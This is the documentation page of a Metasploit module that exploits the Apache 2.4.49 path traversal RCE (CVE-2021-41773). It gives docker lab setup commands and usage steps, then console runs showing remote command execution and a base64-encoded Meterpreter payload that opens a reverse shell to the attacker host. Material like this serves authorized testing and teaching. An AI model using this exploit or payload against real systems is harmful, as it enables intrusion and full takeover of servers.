This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).

If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
it can be used to execute arbitrary commands (Remote Command Execution).

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a
path traversal attack to map URLs to files outside the expected document root.

If files outside of the document root are not protected by "require all denied" these requests can succeed.

Additionally this flaw could leak the source of interpreted files like CGI scripts.

## Vulnerable Application

This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.

### Make your lab

```
docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-41773
docker start CVE-2021-41773
```

## Verification Steps

1. Start `msfconsole`
2. `use exploit/linux/http/apache_normalize_path_rce`
3. `set RHOSTS [IP]`
4. `set LHOST [IP]`
5. `run`

## Options

**DEPTH**

Depth for path traversal. Default: 5

**TARGETURI**

Base path. Default: `/cgi-bin`

## Scenarios

### Command Line Interface

```
msf6 exploit(linux/http/apache_normalize_path_rce) > set RHOSTS 172.20.4.12
RHOSTS => 172.20.4.12
msf6 exploit(linux/http/apache_normalize_path_rce) > set RPORT 8080
RPORT => 8080
msf6 exploit(linux/http/apache_normalize_path_rce) > set SSL false 
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 exploit(linux/http/apache_normalize_path_rce) > set target 1
target => 1
msf6 exploit(linux/http/apache_normalize_path_rce) > set CMD uname -a
CMD => uname -a
msf6 exploit(linux/http/apache_normalize_path_rce) > run

[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://172.20.4.12:8080 - The target is vulnerable to CVE-2021-41773.
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://172.20.4.12:8080 - Attempt to exploit for CVE-2021-41773
[!] http://172.20.4.12:8080 - Dumping command output in response
Linux 72f445e89670 5.14.0-1-amd64 #1 SMP Debian 5.14.6-3 (2021-09-28) x86_64 GNU/Linux

msf6 exploit(linux/http/apache_normalize_path_rce) > 
```

### Meterpreter

```
msf6 exploit(linux/http/apache_normalize_path_rce) > set RHOSTS 172.20.4.12
RHOSTS => 172.20.4.12
msf6 exploit(linux/http/apache_normalize_path_rce) > set RPORT 8080
RPORT => 8080
msf6 exploit(linux/http/apache_normalize_path_rce) > set SSL false
SSL => false
msf6 exploit(linux/http/apache_normalize_path_rce) > set LHOST 172.20.7.36
LHOST => 172.20.7.36
msf6 exploit(linux/http/apache_normalize_path_rce) > set VERBOSE true
VERBOSE => true
msf6 exploit(linux/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 172.20.7.36:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://172.20.4.12:8080 - The target is vulnerable to CVE-2021-41773.
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://172.20.4.12:8080 - Attempt to exploit for CVE-2021-41773
[*] http://172.20.4.12:8080 - Sending linux/x64/meterpreter/reverse_tcp command payload
[*] http://172.20.4.12:8080 - Generated command payload: echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXKwUByRRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== | base64 -d > /tmp/KmFqCNH; chmod +x /tmp/KmFqCNH; /tmp/KmFqCNH; rm -f /tmp/KmFqCNH
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012548 bytes) to 172.20.4.12
[*] Meterpreter session 3 opened (172.20.7.36:4444 -> 172.20.4.12:58678) at 2021-10-06 22:20:16 +0400
[!] This exploit may require manual cleanup of '/tmp/KmFqCNH' on the target

meterpreter > 
```
